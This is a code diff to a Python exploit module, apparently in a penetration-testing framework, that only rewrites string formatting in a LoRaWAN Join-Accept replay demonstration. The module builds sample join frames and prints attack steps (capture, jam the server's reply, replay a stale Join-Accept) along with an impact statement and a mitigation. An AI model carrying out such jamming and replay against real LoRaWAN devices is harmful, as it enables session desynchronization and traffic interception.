@@ -165,14 +165,14 @@ class Exploit(Exploit):
             print_error("Invalid AppEUI or DevEUI format")
             return
 
-        print_info("AppEUI: 0x{:016X}".format(app_eui))
-        print_info("DevEUI: 0x{:016X}".format(dev_eui))
-        print_info("Frequency: {} Hz, SF: {}".format(self.frequency, self.spreading_factor))
+        print_info(f"AppEUI: 0x{app_eui:016X}")
+        print_info(f"DevEUI: 0x{dev_eui:016X}")
+        print_info(f"Frequency: {self.frequency} Hz, SF: {self.spreading_factor}")
 
         print_status("Constructing sample Join-Request...")
         dev_nonce = struct.unpack("<H", os.urandom(2))[0]
         join_req = _build_join_request(app_eui, dev_eui, dev_nonce)
-        print_info("Join-Request: {} bytes, hex: {}".format(len(join_req), join_req.hex()))
+        print_info(f"Join-Request: {len(join_req)} bytes, hex: {join_req.hex()}")
 
         print_status("Constructing sample Join-Accept...")
         app_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] & 0xFFFFFF
@@ -183,22 +183,22 @@ class Exploit(Exploit):
 
         cflist = _build_cflist_eu868()
         join_accept = _build_join_accept(app_nonce, net_id, dev_addr, dl_settings, rx_delay, cflist)
-        print_info("Join-Accept: {} bytes, hex: {}".format(len(join_accept), join_accept.hex()))
+        print_info(f"Join-Accept: {len(join_accept)} bytes, hex: {join_accept.hex()}")
 
         app_key = os.urandom(16)
         encrypted_accept = _encrypt_join_accept(app_key, join_accept[1:])
         encrypted_frame = join_accept[:1] + encrypted_accept
-        print_info("Encrypted Join-Accept: {} bytes".format(len(encrypted_frame)))
+        print_info(f"Encrypted Join-Accept: {len(encrypted_frame)} bytes")
 
         headers = ("Field", "Value")
         rows = [
-            ("AppEUI", "0x{:016X}".format(app_eui)),
-            ("DevEUI", "0x{:016X}".format(dev_eui)),
-            ("DevNonce", "0x{:04X}".format(dev_nonce)),
-            ("AppNonce", "0x{:06X}".format(app_nonce)),
-            ("NetID", "0x{:06X}".format(net_id)),
-            ("DevAddr", "0x{:08X}".format(dev_addr)),
-            ("DLSettings", "0x{:02X}".format(dl_settings)),
+            ("AppEUI", f"0x{app_eui:016X}"),
+            ("DevEUI", f"0x{dev_eui:016X}"),
+            ("DevNonce", f"0x{dev_nonce:04X}"),
+            ("AppNonce", f"0x{app_nonce:06X}"),
+            ("NetID", f"0x{net_id:06X}"),
+            ("DevAddr", f"0x{dev_addr:08X}"),
+            ("DLSettings", f"0x{dl_settings:02X}"),
             ("RxDelay", str(rx_delay)),
             ("CFList", "EU868 (5 extra channels)" if cflist else "None"),
         ]
@@ -209,16 +209,12 @@ class Exploit(Exploit):
         print_info("  2. Capture corresponding Join-Accept from network server")
         print_info("  3. Wait for target device to initiate new join procedure")
         print_info("  4. Jam the legitimate Join-Accept from the server")
-        print_info("  5. Replay the previously captured Join-Accept after {:.1f}s".format(
-            float(self.replay_delay),
-        ))
+        print_info(f"  5. Replay the previously captured Join-Accept after {float(self.replay_delay):.1f}s")
         print_info("  6. Device derives session keys from stale JoinNonce")
 
         print_warning("Impact: session key desynchronization, potential traffic interception")
         print_info("Mitigation: upgrade to LoRaWAN 1.1 with JoinNonce monotonic validation")
         print_info(
-            "To execute: configure SDR '{}' on {} Hz, "
-            "SF{} for capture and replay".format(
-                self.interface, self.frequency, self.spreading_factor,
-            )
+            f"To execute: configure SDR '{self.interface}' on {self.frequency} Hz, "
+            f"SF{self.spreading_factor} for capture and replay"
         )
